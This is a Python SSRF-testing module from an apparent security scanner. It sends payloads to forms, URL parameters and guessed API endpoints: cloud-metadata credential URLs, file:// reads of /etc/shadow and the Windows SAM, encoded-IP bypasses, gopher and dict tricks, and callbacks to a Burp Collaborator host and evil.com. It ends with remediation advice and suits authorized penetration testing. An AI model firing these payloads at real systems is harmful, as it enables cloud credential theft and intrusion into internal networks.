"""Server-Side Request Forgery (SSRF) Testing Module

Tests for SSRF vulnerabilities including internal network scanning,
DNS rebinding, file protocol abuse, blind SSRF, and cloud metadata attacks.
"""

import requests
import time
import sys
import os
import random
import string
from urllib.parse import urlparse, quote, unquote
import json

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class SSRFTesting:
    """Server-Side Request Forgery testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CyberGuardian/2.0'})

        # Generate unique callback identifier
        self.callback_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.callback_url = f"https://{self.callback_id}.burpcollaborator.net"

        # SSRF test payloads
        self.internal_network_payloads = [
            # AWS metadata
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/public-keys/',

            # GCP metadata
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://169.254.169.254/computeMetadata/v1/',

            # Azure metadata
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',

            # Internal network ranges
            'http://127.0.0.1:22',        # SSH
            'http://127.0.0.1:3306',      # MySQL
            'http://127.0.0.1:5432',      # PostgreSQL
            'http://127.0.0.1:6379',      # Redis
            'http://127.0.0.1:9200',      # ElasticSearch
            'http://127.0.0.1:27017',     # MongoDB
            'http://127.0.0.1:11211',     # Memcached

            # Private IP ranges
            'http://10.0.0.1:80',
            'http://172.16.0.1:80',
            'http://192.168.0.1:80',
            'http://192.168.1.1:80',
        ]

        self.file_protocol_payloads = [
            # File protocol abuse
            'file:///etc/passwd',
            'file:///etc/shadow',
            'file:///etc/hosts',
            'file:///proc/version',
            'file:///proc/self/environ',
            'file:///proc/net/arp',
            'file:///etc/apache2/apache2.conf',
            'file:///etc/nginx/nginx.conf',
            'file:///var/log/apache2/access.log',
            'file:///var/log/nginx/access.log',

            # Windows file paths
            'file://c:/windows/win.ini',
            'file://c:/boot.ini',
            'file://c:/windows/system32/drivers/etc/hosts',
            'file://c:/windows/system32/config/sam',
        ]

        self.dns_rebinding_payloads = [
            # DNS rebinding techniques
            f'http://{self.callback_id}.burpcollaborator.net',
            'http://127.0.0.1.nip.io',
            'http://localhost.localtest.me',
            'http://localtest.me',
            'http://127.0.0.1.sslip.io',
            'http://[::1].sslip.io',  # IPv6
        ]

        self.blind_ssrf_payloads = [
            # Blind SSRF payloads using external callbacks
            f'http://{self.callback_id}.burpcollaborator.net',
            f'https://{self.callback_id}.burpcollaborator.net',
            f'ftp://{self.callback_id}.burpcollaborator.net',
            f'dns://{self.callback_id}.burpcollaborator.net',
            f'gopher://{self.callback_id}.burpcollaborator.net:80/_GET%20http%3a%2f%2fevil.com%2f',
        ]

        self.encoded_payloads = [
            # URL encoded variations
            'http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F',
            'http://169.254.169.254/latest/meta-data/',
            'http://%31%36%39%2E%32%35%34%2E%31%36%39%2E%32%35%34/latest/meta-data/',  # Double URL encoded

            # IP address variations
            'http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/',  # Hex
            'http://2852039166/latest/meta-data/',           # Decimal
            'http://0xA9FEA9FE/latest/meta-data/',           # Hexadecimal
            'http://025177.025376.025177.025376/latest/meta-data/',  # Octal

            # IPv6 variations
            'http://[::ffff:169.254.169.254]/latest/meta-data/',
            'http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/',
        ]

        self.protocol_variations = [
            # Different protocol handlers
            'dict://127.0.0.1:6379/info',
            'gopher://127.0.0.1:6379/_info',
            'ftp://127.0.0.1:21',
            'tftp://127.0.0.1:69',
            'ldap://127.0.0.1:389',
            'http://localhost:80',
            'http://0.0.0.0:80',
        ]

    def test_ssrf(self):
        """Main SSRF testing function"""
        print(colored("\n╔═══════════════════ SSRF TESTING ══════════════════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            results = {
                'internal_network': self._test_internal_network_ssrf(),
                'file_protocol': self._test_file_protocol_ssrf(),
                'dns_rebinding': self._test_dns_rebinding_ssrf(),
                'blind_ssrf': self._test_blind_ssrf(),
                'encoded_payloads': self._test_encoded_payloads(),
                'protocol_variations': self._test_protocol_variations(),
                'api_endpoints': self._test_api_ssrf()
            }

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"SSRF test failed: {str(e)}")
            return {}

    def _test_internal_network_ssrf(self):
        """Test for internal network SSRF"""
        print(f"{colored('Testing internal network SSRF...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'responses': []
        }

        # Find forms and parameters to test
        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.internal_network_payloads:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['responses'].append(result['response'][:200])
                        print(f"    {colored('✗ Internal Network SSRF Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        print(f"      Response: {colored(result['response'][:100] + '...', 'white')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Internal network SSRF not detected', 'green')}")
        return results

    def _test_file_protocol_ssrf(self):
        """Test for file protocol SSRF"""
        print(f"{colored('Testing file protocol SSRF...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'files': []
        }

        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.file_protocol_payloads:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['files'].append(payload.split('/')[-1])
                        print(f"    {colored('✗ File Protocol SSRF Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        print(f"      File: {colored(payload.split('/')[-1], 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ File protocol SSRF not detected', 'green')}")
        return results

    def _test_dns_rebinding_ssrf(self):
        """Test for DNS rebinding SSRF"""
        print(f"{colored('Testing DNS rebinding SSRF...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'callback_domains': []
        }

        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.dns_rebinding_payloads:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['callback_domains'].append(payload.split('//')[1].split('/')[0])
                        print(f"    {colored('✗ DNS Rebinding SSRF Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        print(f"      Domain: {colored(payload.split('//')[1].split('/')[0], 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ DNS rebinding SSRF not detected', 'green')}")
        return results

    def _test_blind_ssrf(self):
        """Test for blind SSRF using external callbacks"""
        print(f"{colored('Testing blind SSRF...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'callback_id': self.callback_id
        }

        print(f"  {colored('ℹ Blind SSRF requires callback server', 'blue')}")
        print(f"  {colored('ℹ Callback ID:', 'blue')} {self.callback_id}")

        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.blind_ssrf_payloads:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result and result.get('status_code') == 200:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        print(f"    {colored('⚠ Potential Blind SSRF:', 'yellow', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        print(f"      Note: Check callback server for confirmation")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Blind SSRF not detected', 'green')}")
        return results

    def _test_encoded_payloads(self):
        """Test encoded SSRF payloads"""
        print(f"{colored('Testing encoded SSRF payloads...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'encoding_types': []
        }

        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.encoded_payloads:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result['vulnerable']:
                        encoding_type = self._detect_encoding_type(payload)
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['encoding_types'].append(encoding_type)
                        print(f"    {colored('✗ Encoded SSRF Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                        print(f"      Encoding: {colored(encoding_type, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Encoded SSRF not detected', 'green')}")
        return results

    def _test_protocol_variations(self):
        """Test different protocol handlers"""
        print(f"{colored('Testing protocol variations...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'protocols': []
        }

        test_vectors = self._find_ssrf_vectors()

        for vector in test_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.protocol_variations:
                try:
                    result = self._test_ssrf_payload(vector, payload)
                    if result['vulnerable']:
                        protocol = payload.split('://')[0]
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['protocols'].append(protocol)
                        print(f"    {colored('✗ Protocol SSRF Found:', 'red', attrs=['bold'])}")
                        print(f"      Payload: {colored(payload, 'yellow')}")
                        print(f"      Protocol: {colored(protocol, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Protocol variation SSRF not detected', 'green')}")
        return results

    def _test_api_ssrf(self):
        """Test API endpoints for SSRF"""
        print(f"{colored('Testing API endpoints SSRF...', 'yellow')}")

        results = {
            'vulnerable': False,
            'endpoints': [],
            'payloads': []
        }

        # Common API endpoints that might be vulnerable to SSRF
        api_endpoints = [
            '/api/image',
            '/api/proxy',
            '/api/fetch',
            '/api/download',
            '/api/preview',
            '/api/convert',
            '/api/render',
            '/api/webhook',
            '/api/callback',
            '/api/redirect',
        ]

        for endpoint in api_endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"
                print(f"  {colored('Testing endpoint:', 'white')} {endpoint}")

                for payload in self.internal_network_payloads[:5]:  # Test first 5 payloads
                    try:
                        result = self._test_api_ssrf_endpoint(url, payload)
                        if result['vulnerable']:
                            results['vulnerable'] = True
                            results['endpoints'].append(endpoint)
                            results['payloads'].append(payload)
                            print(f"    {colored('✗ API SSRF Found:', 'red', attrs=['bold'])}")
                            print(f"      Endpoint: {colored(endpoint, 'yellow')}")
                            print(f"      Payload: {colored(payload, 'yellow')}")
                            return results
                    except:
                        continue
            except:
                continue

        print(f"  {colored('✓ API SSRF not detected', 'green')}")
        return results

    def _find_ssrf_vectors(self):
        """Find potential SSRF vectors (forms, parameters, etc.)"""
        vectors = []

        # Find forms
        try:
            from bs4 import BeautifulSoup
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Look for forms with URL-type inputs
            for form in soup.find_all('form'):
                form_info = {
                    'type': 'form',
                    'name': f"Form: {form.get('action', 'unknown')}",
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }

                for input_tag in form.find_all(['input', 'textarea']):
                    input_name = input_tag.get('name', '')
                    input_type = input_tag.get('type', 'text')

                    if input_name and input_type in ['url', 'text', 'hidden', 'search']:
                        form_info['inputs'].append({
                            'name': input_name,
                            'type': input_type,
                            'value': input_tag.get('value', '')
                        })

                if form_info['inputs']:
                    vectors.append(form_info)

        except:
            pass

        # Add URL parameters as vectors
        try:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            for param_name in params.keys():
                vectors.append({
                    'type': 'url_parameter',
                    'name': f"URL Parameter: {param_name}",
                    'param': param_name,
                    'url': self.target
                })
        except:
            pass

        # Add API endpoints as vectors
        api_vectors = [
            {'type': 'api', 'name': 'API Endpoint: /api/fetch', 'url': f"{self.target.rstrip('/')}/api/fetch"},
            {'type': 'api', 'name': 'API Endpoint: /api/proxy', 'url': f"{self.target.rstrip('/')}/api/proxy"},
            {'type': 'api', 'name': 'API Endpoint: /api/image', 'url': f"{self.target.rstrip('/')}/api/image"},
        ]

        vectors.extend(api_vectors)

        return vectors

    def _test_ssrf_payload(self, vector, payload):
        """Test SSRF payload against a vector"""
        try:
            if vector['type'] == 'form':
                return self._test_form_ssrf(vector, payload)
            elif vector['type'] == 'url_parameter':
                return self._test_url_parameter_ssrf(vector, payload)
            elif vector['type'] == 'api':
                return self._test_api_ssrf_endpoint(vector['url'], payload)
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def _test_form_ssrf(self, form, payload):
        """Test SSRF in form submission"""
        try:
            action = form['action']
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)

            data = {}
            for input_field in form['inputs']:
                # Test with payload in URL or text fields
                if input_field['type'] in ['url', 'text', 'hidden', 'search']:
                    data[input_field['name']] = payload
                else:
                    data[input_field['name']] = input_field['value'] or 'test'

            if form['method'] == 'post':
                response = self.session.post(action, data=data, timeout=15, verify=False)
            else:
                response = self.session.get(action, params=data, timeout=15, verify=False)

            return self._analyze_ssrf_response(response, payload)
        except:
            return {'vulnerable': False}

    def _test_url_parameter_ssrf(self, param_info, payload):
        """Test SSRF in URL parameter"""
        try:
            from urllib.parse import urlparse, parse_qs, urlencode

            parsed = urlparse(param_info['url'])
            params = parse_qs(parsed.query)
            params[param_info['param']] = [payload]

            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            response = self.session.get(test_url, timeout=15, verify=False)
            return self._analyze_ssrf_response(response, payload)
        except:
            return {'vulnerable': False}

    def _test_api_ssrf_endpoint(self, url, payload):
        """Test SSRF in API endpoint"""
        try:
            # Try different API payload formats
            api_payloads = {
                'url': payload,
                'target': payload,
                'endpoint': payload,
                'resource': payload,
                'image': payload,
                'file': payload,
                'fetch': payload,
                'proxy': payload
            }

            for param_name, param_value in api_payloads.items():
                try:
                    # Test GET request
                    response = self.session.get(url, params={param_name: param_value}, timeout=15, verify=False)
                    result = self._analyze_ssrf_response(response, payload)
                    if result['vulnerable']:
                        return result

                    # Test POST request
                    response = self.session.post(url, json={param_name: param_value}, timeout=15, verify=False)
                    result = self._analyze_ssrf_response(response, payload)
                    if result['vulnerable']:
                        return result

                except:
                    continue

        except:
            pass

        return {'vulnerable': False}

    def _analyze_ssrf_response(self, response, payload):
        """Analyze HTTP response for SSRF evidence"""
        if not response:
            return {'vulnerable': False, 'response': ''}

        response_text = response.text

        # Check for metadata service responses
        metadata_indicators = [
            'ami-id', 'instance-id', 'local-hostname', 'public-hostname',
            'iam/security-credentials', 'computeMetadata', 'instance',
            'project-id', 'zone', 'cluster-name', 'network',
        ]

        for indicator in metadata_indicators:
            if indicator.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'response': response_text[:500],
                    'indicator': indicator,
                    'status_code': response.status_code
                }

        # Check for file content responses
        file_indicators = [
            'root:x:0:0',          # /etc/passwd
            'daemon:x:1:1',        # /etc/passwd
            '127.0.0.1',           # /etc/hosts
            'localhost',           # /etc/hosts
            '[boot loader]',       # Windows boot.ini
            'for 16-bit app support', # Windows win.ini
            'fonts', 'extensions', 'files', # Windows win.ini
        ]

        for indicator in file_indicators:
            if indicator.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'response': response_text[:500],
                    'indicator': f"File content: {indicator}",
                    'status_code': response.status_code
                }

        # Check for service banners
        service_indicators = [
            'redis_version',        # Redis
            'mysql', 'mariadb',     # MySQL/MariaDB
            'postgresql', 'postgres', # PostgreSQL
            'elasticsearch',        # ElasticSearch
            'mongodb', 'mongo',     # MongoDB
            'memcached',            # Memcached
            'ssh-',                 # SSH
            'apache', 'nginx',      # Web servers
        ]

        for indicator in service_indicators:
            if indicator.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'response': response_text[:500],
                    'indicator': f"Service banner: {indicator}",
                    'status_code': response.status_code
                }

        # Check for connection timeouts or connection refused (might indicate internal access)
        if response.status_code in [404, 500, 502, 503, 504]:
            if any(ip in payload for ip in ['127.0.0.1', '169.254.169.254', '10.', '192.168.', '172.16.']):
                return {
                    'vulnerable': True,
                    'response': f"Status {response.status_code} when accessing internal IP",
                    'indicator': 'Internal IP access',
                    'status_code': response.status_code
                }

        return {
            'vulnerable': False,
            'response': response_text[:200],
            'status_code': response.status_code
        }

    def _detect_encoding_type(self, payload):
        """Detect the type of encoding used in payload"""
        if '%' in payload and '%25' in payload:
            return 'Double URL encoded'
        elif '%' in payload:
            return 'URL encoded'
        elif '0x' in payload and '.' in payload:
            return 'Hexadecimal IP'
        elif payload.replace('.', '').isdigit():
            return 'Decimal IP'
        elif payload.startswith('[') and ']' in payload:
            return 'IPv6'
        elif '0' in payload and len(payload.split('.')) == 4:
            return 'Octal IP'
        else:
            return 'Unknown encoding'

    def _print_summary(self, results):
        """Print summary of SSRF test results"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vulnerable_count = sum(1 for r in results.values() if isinstance(r, dict) and r.get('vulnerable'))
        total_tests = sum(1 for r in results.values() if isinstance(r, dict))

        print(f"{colored('SSRF TESTING SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Tests performed: {colored(str(total_tests), 'green')}")
        print(f"  • Vulnerabilities found: {colored(str(vulnerable_count), 'red' if vulnerable_count > 0 else 'green')}")

        if vulnerable_count > 0:
            print(f"\n{colored('⚠ SSRF VULNERABILITIES DETECTED:', 'red', attrs=['bold'])}")

            for test_type, result in results.items():
                if isinstance(result, dict) and result.get('vulnerable'):
                    print(f"  • {colored(test_type.replace('_', ' ').title(), 'red')}:")
                    for payload in result.get('payloads', [])[:3]:
                        print(f"    - {colored(payload[:50] + '...' if len(payload) > 50 else payload, 'yellow')}")
                    if result.get('responses'):
                        for response in result.get('responses', [])[:1]:
                            print(f"    Response: {colored(response[:100] + '...', 'white')}")

            print(f"\n{colored('🚨 CRITICAL RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • SSRF can lead to:")
            print(f"    - Internal network access")
            print(f"    - Cloud metadata theft")
            print(f"    - File system access")
            print(f"    - Service enumeration")
            print(f"    - Firewall bypass")
            print(f"    - Remote code execution")

            print(f"\n{colored('📋 REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. Validate and sanitize all user input")
            print(f"  2. Use allowlist for permitted URLs/domains")
            print(f"  3. Implement network segmentation")
            print(f"  4. Disable unused protocols")
            print(f"  5. Use web application firewall (WAF)")
            print(f"  6. Block access to private IP ranges")
            print(f"  7. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No SSRF vulnerabilities detected', 'green')}\n")